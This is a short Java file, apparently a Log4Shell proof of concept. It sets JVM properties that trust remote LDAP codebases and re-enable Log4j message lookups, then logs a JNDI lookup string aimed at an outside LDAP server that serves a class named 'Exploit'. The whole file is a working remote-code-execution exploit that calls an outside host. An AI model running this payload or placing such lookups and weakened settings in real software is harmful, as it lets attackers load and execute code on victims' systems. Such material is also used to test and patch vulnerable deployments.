package com.virtualpuffer;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class SecureTest {
    private static final Logger logger = LogManager.getLogger(SecureTest.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        System.setProperty("Dlog4j2.formatMsgNoLookups","false");
        logger.error("${jndi:ldap://47.96.253.99:10002/Exploit.class}");
    }
}
